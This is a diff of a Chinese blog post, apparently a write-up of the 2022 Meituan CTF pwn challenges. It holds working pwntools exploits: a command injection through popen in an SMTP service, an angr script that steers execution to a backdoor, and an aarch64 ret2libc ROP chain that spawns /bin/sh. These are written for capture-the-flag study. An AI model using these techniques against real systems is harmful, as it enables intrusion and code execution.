class="number">0x0804D140</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p32(<span class="number">0x08049024</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(elf.plt[<span class="string">&#x27;popen&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(bss) + p32(read)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;RCPT TO:&#x27;</span> + payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;DATA&#x27;</span> + <span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;.\r\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
 
+io = remote(&quot;127.0.0.1&quot;, 9999)
+elf = ELF(&quot;./pwn&quot;)
+
+io.sendlineafter(b&#39;220 SMTP tsmtp&#39;, b&#39;HELO&#39;)
+io.sendlineafter(b&#39;250 Ok&#39;, b&#39;MAIL FROM:&#39; + b&#39;cat flag &gt;&amp;5&#39;)   # shellcode
+read = elf.search(b&#39;r\x00&#39;).__next__()
+bss = 0x0804D140
+payload = b&#39;a&#39; * 0x100 + p32(0x08049024) + b&#39;a&#39; * 0xc + p32(elf.plt[&#39;popen&#39;]) + p32(0xdeadbeef) + p32(bss) + p32(read)
+io.sendlineafter(b&#39;250 Ok&#39;, b&#39;RCPT TO:&#39; + payload)
+io.sendlineafter(b&#39;250 Ok&#39;, b&#39;DATA&#39; + b&#39;bbbb&#39;)
+io.sendline(b&#39;.\r\n&#39;)
+io.interactive()
+</code></pre>
 <br>
 
-<h1 id="0x02：捉迷藏"><a href="#0x02：捉迷藏" class="headerlink" title="0x02：捉迷藏"></a>0x02：捉迷藏</h1><p>下面是程序的函数调用关系图，这样一看，倒不算是太复杂。但点进main函数一看，💩💩💩。</p>
+<h2 id="0x02：捉迷藏"><a href="#0x02：捉迷藏" class="headerlink" title="0x02：捉迷藏"></a>0x02：捉迷藏</h2><p>下面是程序的函数调用关系图，这样一看，倒不算是太复杂。但点进main函数一看，💩💩💩。</p>
 <img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic04.png" alt="pic04" style="zoom:80%;" />
 
 <br>
@@ -190,30 +387,173 @@
 <p>我们首先通过angr找到能执行到该路径的符号变量，然后添加能执行getshell的约束，当符号变量满足时，发送数据去getshell（噢~这糟糕的表达🤧）。因为程序执行过程中<code>fksth</code>、<code>input_line</code>和<code>input_val</code>函数会大量执行，且其内部含有循环，为了防止探索过程中路径爆炸，需要编写相应的hook函数对其替代。具体的hook函数见exp中的<code>ReplacementCheckEquals</code>、<code>ReplacementInputVal</code>和<code>ReplacementCheckInput</code>函数。至于文中state的<code>unconstrained</code>，个人理解是保存需要用户输入的路径。</p>
 <p>本题的一个疑惑点是add_constraints函数具体做了什么？d = simgr.explore()之后，d.unconstrained是固定的了，那每个路径约束的符号变量会不会是多个呢？如果是单个的话，显然后面的添加的约束就没有意义了。还有就是添加的约束是要求对地址绝对的符合，如果符号变量的随机模拟的，岂不是相当于爆破？不过，执行exp很快就有结果了，个人猜测：某次检查符号变量不满足那两个约束后，下一次生成符号变量时，angr会不会有什么机制根据上一次的受阻约束来进行调整，从而生成满足这两个约束的符号变量。</p>
 <p>看来还得深入了解~</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 来自toka师傅的exp</span></span><br><span class="line"><span class="comment"># ipython3 exp.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">ret_rop = <span class="number">0x4013C8</span></span><br><span class="line"> </span><br><span class="line">r=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p = angr.Project(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getBVV</span>(<span class="params">state, sizeInBytes, <span class="built_in">type</span> = <span class="string">&#x27;str&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">global</span> pathConditions</span><br><span class="line">    name = <span class="string">&#x27;s_&#x27;</span> + <span class="built_in">str</span>(state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>])</span><br><span class="line">    bvs = claripy.BVS(name, sizeInBytes * <span class="number">8</span>)</span><br><span class="line">    state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    state.<span class="built_in">globals</span>[name] = (bvs, <span class="built_in">type</span>)</span><br><span class="line">    <span class="keyword">return</span> bvs</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr_load_str</span>(<span class="params">state, addr</span>):</span><br><span class="line">    s, i = <span class="string">&#x27;&#x27;</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ch = state.solver.<span class="built_in">eval</span>(state.memory.load(addr + i, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">        s += <span class="built_in">chr</span>(ch)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementCheckEquals</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, str1, str2</span>):</span><br><span class="line">        cmp1 = angr_load_str(self.state, str2).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        cmp0 = self.state.memory.load(str1, <span class="built_in">len</span>(cmp1))</span><br><span class="line">        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(<span class="number">0</span>, <span class="number">32</span>), claripy.BVV(<span class="number">1</span>, <span class="number">32</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementCheckInput</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buf, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="built_in">len</span> = self.state.solver.<span class="built_in">eval</span>(<span class="built_in">len</span>)</span><br><span class="line">        self.state.memory.store(buf, getBVV(self.state, <span class="built_in">len</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementInputVal</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        self.state.regs.rax = getBVV(self.state, <span class="number">4</span>, <span class="string">&#x27;int&#x27;</span>) </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.hook_symbol(<span class="string">&quot;fksth&quot;</span>, ReplacementCheckEquals())</span><br><span class="line">p.hook_symbol(<span class="string">&quot;input_line&quot;</span>, ReplacementCheckInput())</span><br><span class="line">p.hook_symbol(<span class="string">&quot;input_val&quot;</span>, ReplacementInputVal())</span><br><span class="line"> </span><br><span class="line">enter = p.factory.entry_state()</span><br><span class="line">enter.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>] = <span class="number">0</span></span><br><span class="line">simgr = p.factory.simgr(enter, save_unconstrained=<span class="literal">True</span>)</span><br><span class="line">d = simgr.explore()</span><br><span class="line">backdoor = p.loader.find_symbol(<span class="string">&#x27;backdoor&#x27;</span>).rebased_addr</span><br><span class="line"><span class="keyword">for</span> state <span class="keyword">in</span> d.unconstrained:</span><br><span class="line">    bindata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rsp = state.regs.rsp</span><br><span class="line">    next_stack = state.memory.load(rsp, <span class="number">8</span>, endness=p.arch.memory_endness)</span><br><span class="line">    state.add_constraints(state.regs.rip == ret_rop)</span><br><span class="line">    state.add_constraints(next_stack == backdoor)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>]):</span><br><span class="line">        s, s_type = state.<span class="built_in">globals</span>[<span class="string">&#x27;s_&#x27;</span> + <span class="built_in">str</span>(i)]</span><br><span class="line">        <span class="keyword">if</span> s_type == <span class="string">&#x27;str&#x27;</span>:</span><br><span class="line">            bb = state.solver.<span class="built_in">eval</span>(s, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">            <span class="keyword">if</span> bb.count(<span class="string">b&#x27;\x00&#x27;</span>) == <span class="built_in">len</span>(bb):</span><br><span class="line">                bb = <span class="string">b&#x27;A&#x27;</span> * bb.count(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            bindata += bb</span><br><span class="line">            <span class="built_in">print</span>(bb)</span><br><span class="line">        <span class="keyword">elif</span> s_type == <span class="string">&#x27;int&#x27;</span>:</span><br><span class="line">            bindata += <span class="built_in">str</span>(state.solver.<span class="built_in">eval</span>(s, cast_to=<span class="built_in">int</span>)).encode(<span class="string">&#x27;ASCII&#x27;</span>) + <span class="string">b&#x27; &#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(state.solver.<span class="built_in">eval</span>(s, cast_to=<span class="built_in">int</span>)).encode(<span class="string">&#x27;ASCII&#x27;</span>) + <span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(bindata)</span><br><span class="line">    r.send(bindata)</span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="python"># 来自toka师傅的exp
+# ipython3 exp.py
+from pwn import *
+import angr
+import claripy
+import base64
+ret_rop = 0x4013C8
+ 
+r=process(&quot;./pwn&quot;)
+ 
+p = angr.Project(&quot;./pwn&quot;)
+ 
+def getBVV(state, sizeInBytes, type = &#39;str&#39;):
+    global pathConditions
+    name = &#39;s_&#39; + str(state.globals[&#39;symbols_count&#39;])
+    bvs = claripy.BVS(name, sizeInBytes * 8)
+    state.globals[&#39;symbols_count&#39;] += 1
+    state.globals[name] = (bvs, type)
+    return bvs
+ 
+def angr_load_str(state, addr):
+    s, i = &#39;&#39;, 0
+    while True:
+        ch = state.solver.eval(state.memory.load(addr + i, 1))
+        if ch == 0: break
+        s += chr(ch)
+        i += 1
+    return s
+ 
+class ReplacementCheckEquals(angr.SimProcedure):
+    def run(self, str1, str2):
+        cmp1 = angr_load_str(self.state, str2).encode(&quot;ascii&quot;)
+        cmp0 = self.state.memory.load(str1, len(cmp1))
+        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(0, 32), claripy.BVV(1, 32))
+ 
+class ReplacementCheckInput(angr.SimProcedure):
+    def run(self, buf, len):
+        len = self.state.solver.eval(len)
+        self.state.memory.store(buf, getBVV(self.state, len))
+ 
+class ReplacementInputVal(angr.SimProcedure):
+    def run(self):
+        self.state.regs.rax = getBVV(self.state, 4, &#39;int&#39;) 
+ 
+ 
+p.hook_symbol(&quot;fksth&quot;, ReplacementCheckEquals())
+p.hook_symbol(&quot;input_line&quot;, ReplacementCheckInput())
+p.hook_symbol(&quot;input_val&quot;, ReplacementInputVal())
+ 
+enter = p.factory.entry_state()
+enter.globals[&#39;symbols_count&#39;] = 0
+simgr = p.factory.simgr(enter, save_unconstrained=True)
+d = simgr.explore()
+backdoor = p.loader.find_symbol(&#39;backdoor&#39;).rebased_addr
+for state in d.unconstrained:
+    bindata = b&#39;&#39;
+    rsp = state.regs.rsp
+    next_stack = state.memory.load(rsp, 8, endness=p.arch.memory_endness)
+    state.add_constraints(state.regs.rip == ret_rop)
+    state.add_constraints(next_stack == backdoor)
+    for i in range(state.globals[&#39;symbols_count&#39;]):
+        s, s_type = state.globals[&#39;s_&#39; + str(i)]
+        if s_type == &#39;str&#39;:
+            bb = state.solver.eval(s, cast_to=bytes)
+            if bb.count(b&#39;\x00&#39;) == len(bb):
+                bb = b&#39;A&#39; * bb.count(b&#39;\x00&#39;)
+            bindata += bb
+            print(bb)
+        elif s_type == &#39;int&#39;:
+            bindata += str(state.solver.eval(s, cast_to=int)).encode(&#39;ASCII&#39;) + b&#39; &#39;
+            print(str(state.solver.eval(s, cast_to=int)).encode(&#39;ASCII&#39;) + b&#39; &#39;)
+    print(bindata)
+    r.send(bindata)
+    r.interactive()
+    break
+</code></pre>
 <br>
 
-<h1 id="0x03：ret2libc-aarch64"><a href="#0x03：ret2libc-aarch64" class="headerlink" title="0x03：ret2libc_aarch64"></a>0x03：ret2libc_aarch64</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/aarch $ checksec pwn</span><br><span class="line">[*] &#x27;/home/tolele/CTFgame/2022MTCTF/pwn/aarch/pwn&#x27;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3f0000)</span><br></pre></td></tr></table></figure>
-
+<h2 id="0x03：ret2libc-aarch64"><a href="#0x03：ret2libc-aarch64" class="headerlink" title="0x03：ret2libc_aarch64"></a>0x03：ret2libc_aarch64</h2><pre><code>tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/aarch $ checksec pwn
+[*] &#39;/home/tolele/CTFgame/2022MTCTF/pwn/aarch/pwn&#39;
+    Arch:     aarch64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3f0000)
+</code></pre>
 <p>一道aarch64指令架构的题，具体的指令可以自行上网搜索。</p>
 <p>用IDA进行静态分析：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [xsp+1Ch] [xbp+1Ch]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v4 = get_int();</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;sensible&gt;&gt;&quot;</span>);</span><br><span class="line">      leak();                                   <span class="comment">// 泄露libc基址</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != <span class="number">2</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sensible&gt;&gt;&quot;</span>);</span><br><span class="line">  overflow();                                   <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  int v4; // [xsp+1Ch] [xbp+1Ch]
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leak函数</span></span><br><span class="line">__int64 <span class="title function_">leak</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *buf; <span class="comment">// [xsp+18h] [xbp+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  init(argc, argv, envp);
+  do
+  &#123;
+    while ( 1 )
+    &#123;
+      menu();
+      v4 = get_int();
+      if ( v4 == 3 )
+        exit(0);
+      if ( v4 != 1 )
+        break;
+      puts(&quot;sensible&gt;&gt;&quot;);
+      leak();                                   // 泄露libc基址
+    &#125;
+  &#125;
+  while ( v4 != 2 );
+  puts(&quot;sensible&gt;&gt;&quot;);
+  overflow();                                   // 栈溢出
+  return 0;
+&#125;
+</code></pre>
+<pre><code class="C">// leak函数
+__int64 leak()
+&#123;
+  const char *buf; // [xsp+18h] [xbp+18h] BYREF
 
+  buf = 0LL;
+  read(0, &amp;buf, 8uLL);
+  return puts(buf);
+&#125;
+</code></pre>
 <p>leak函数只要输入puts_got，就可以直接泄露libc基址。不过要注意因为该架构下libc地址中有\x00字节产生截断，所以需要加上0x4000000000。</p>
 <br>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// overflow函数</span><br><span class="line">__int64 overflow()</span><br><span class="line">&#123;</span><br><span class="line">  char s[128]; // [xsp+10h] [xbp+10h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(&quot;&gt; &quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(&quot;Your Input: \n&quot;);</span><br><span class="line">  puts(s);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>// overflow函数
+__int64 overflow()
+&#123;
+  char s[128]; // [xsp+10h] [xbp+10h] BYREF
 
+  printf(&quot;&gt; &quot;);
+  gets(s);
+  puts(&quot;Your Input: \n&quot;);
+  puts(s);
+  return 0LL;
+&#125;
+</code></pre>
 <p>Leak完后会有个overflow函数用于ROP利用。这里我打算使用的gadget是libc里的这段，把/bin/sh的地址放入x0，system函数的地址放入x30，然后ret执行。</p>
 <p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic05.png" alt="pic05"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;aarch64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">puts_got =elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;3.Exit.&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;sensible&gt;&gt;\n&quot;</span>, p64(puts_got))</span><br><span class="line">libc_base = u64(io.recv(<span class="number">3</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x4000000000</span> - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;@@@ libc_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">gadget = libc_base + <span class="number">0x63e5c</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;3.Exit.&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">128</span>+<span class="number">8</span>) + p64(gadget) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(system) + p64(<span class="number">0</span>) + p64(binsh)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;sensible&gt;&gt;&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;aarch64&#39;, log_level=&#39;debug&#39;)
 
+io = process(&quot;./pwn&quot;)
+elf = ELF(&quot;./pwn&quot;)
+libc = ELF(&quot;./libc.so.6&quot;)
+puts_got =elf.got[&#39;puts&#39;]
+
+io.sendlineafter(&quot;3.Exit.&quot;, &quot;1&quot;)
+io.sendafter(&quot;sensible&gt;&gt;\n&quot;, p64(puts_got))
+libc_base = u64(io.recv(3).ljust(8, b&#39;\x00&#39;)) + 0x4000000000 - libc.symbols[&#39;puts&#39;]
+print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))
+
+system = libc_base + libc.symbols[&#39;system&#39;]
+binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
+gadget = libc_base + 0x63e5c
+io.sendlineafter(&quot;3.Exit.&quot;, &quot;2&quot;)
+payload = b&#39;A&#39;*(128+8) + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)
+io.sendlineafter(&quot;sensible&gt;&gt;&quot;, payload)
+io.interactive()
+</code></pre>
 <p>在本地打的时候，一开始没打通，调试发现libc的基址竟然时0x55开头，将exp中的0x4000000000改成0x5500000000就好了。难道是环境没模拟好？🤔</p>
 <br>
 
-<h1 id="0x04：题目附件"><a href="#0x04：题目附件" class="headerlink" title="0x04：题目附件"></a>0x04：题目附件</h1><p>2022年第五届美团CTFpwn题附件：</p>
+<h2 id="0x04：题目附件"><a href="#0x04：题目附件" class="headerlink" title="0x04：题目附件"></a>0x04：题目附件</h2><p>2022年第五届美团CTFpwn题附件：</p>
 <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1paNMlzjTSinRXG7adwxDQA">https://pan.baidu.com/s/1paNMlzjTSinRXG7adwxDQA</a><br>提取码：lele</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">tolele</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/10/08/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">http://example.com/2022/10/08/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">tolele的自由小屋</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/fen/wen02.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/09/%E5%BC%82%E6%9E%84Pwn/"><img class="prev-cover" src="/img/fen/wen03.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">异构Pwn</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/02/%E8%AE%B0%E4%B8%80%E6%AC%A1GitHub-Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%BF%87%E7%A8%8B/"><img class="next-cover" src="/img/topimg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">记一次GitHub+Hexo搭建个人博客的过程</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cropPhoto.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">tolele</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/toleleYJL"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/toleleYJL" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1623093551@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/1623093551" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎交流~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%EF%BC%9Anote"><span class="toc-number">1.</span> <span class="toc-text">0x00：note</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%EF%BC%9ASMTP"><span 